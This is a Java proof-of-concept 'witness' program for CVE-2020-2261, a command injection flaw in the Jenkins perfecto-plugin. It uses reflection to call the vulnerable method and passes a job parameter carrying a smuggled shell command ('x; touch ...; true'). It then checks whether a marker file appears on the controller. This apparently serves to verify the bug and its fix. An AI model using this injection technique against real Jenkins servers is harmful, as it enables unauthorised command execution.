import io.plugins.perfecto.PerfectoBuildWrapper;
import java.io.*;
import java.lang.reflect.*;

/**
 * Witness for CVE-2020-2261 (CWE-78 OS command injection) in perfecto-plugin.
 * Source: the job setting pcParameters (attacker = a user who can configure the job).
 * Sink (buggy): Runtime.exec({"bash","-c","(cd "+loc+"; "+baseCommand+" "+pcParameters+")"})
 *   in PerfectoBuildWrapper.getTunnelId -> executes on the Jenkins CONTROLLER.
 * The fix (CVE-2020-2261) removes getTunnelId/Runtime.exec and instead builds a script run via
 * CommandInterpreter.perform on the BUILD AGENT (authorised build-step behaviour, not the CVE).
 * On buggy we execute the injection (harmless marker). On fixed we report that the controller
 * exec sink is absent, so the same payload cannot cross the controller boundary.
 */
public class PerfectoWitness {
  public static void main(String[] a) throws Exception {
    File marker = new File(System.getProperty("java.io.tmpdir"), "PERFECTO_PWNED_" + System.nanoTime());
    if (marker.exists()) marker.delete();
    File loc = File.createTempFile("pcloc", "d"); loc.delete(); loc.mkdirs();
    String payload = "x; touch '" + marker.getAbsolutePath() + "'; true";
    Method g = null;
    try { g = PerfectoBuildWrapper.class.getDeclaredMethod("getTunnelId",
            String.class, String.class, String.class, Class.forName("hudson.model.BuildListener")); }
    catch (NoSuchMethodException e) { g = null; }

    boolean witnessed, injectedRan = false; String note;
    if (g == null) {                                   // fixed: controller exec sink removed
      witnessed = false;
      note = "getTunnelId/Runtime.exec absent; pcParameters now flows to CommandInterpreter.perform on the build agent (authorised build step, not controller RCE)";
    } else {
      g.setAccessible(true);
      PerfectoBuildWrapper w = new PerfectoBuildWrapper(null, null, "xx", payload,
          loc.getAbsolutePath(), null, "pc-connect", null);     // pcParameters = payload
      try { g.invoke(w, loc.getAbsolutePath(), "cloud", "key", makeListener()); }
      catch (Throwable expected) { /* tunnel setup fails; injected cmd already ran */ }
      for (int i = 0; i < 50 && !marker.exists(); i++) Thread.sleep(40);
      injectedRan = marker.exists();
      witnessed = injectedRan;
      note = "injected 'touch' executed on controller=" + injectedRan;
    }
    if (marker.exists()) marker.delete();
    System.out.println("{"
      + "\"subject\":\"perfecto-plugin\",\"cve\":\"CVE-2020-2261\",\"cwe\":\"CWE-78\","
      + "\"source\":\"job setting pcParameters (payload '" + esc(payload) + "')\","
      + "\"sink\":\"Runtime.exec(bash -c ...) in getTunnelId (Jenkins controller)\","
      + "\"witnessed\":" + witnessed + ","
      + "\"evidence\":\"" + esc(note) + "\"}");
  }
  static Object makeListener() throws Exception {
    final PrintStream ps = new PrintStream(new ByteArrayOutputStream());
    return Proxy.newProxyInstance(PerfectoWitness.class.getClassLoader(),
      new Class[]{ Class.forName("hudson.model.BuildListener") },
      (proxy, m, args) -> m.getName().equals("getLogger") ? ps
          : (m.getReturnType() == boolean.class ? Boolean.FALSE : null));
  }
  static String esc(String s){ return s==null?"":s.replace("\\","\\\\").replace("\"","\\\""); }
}
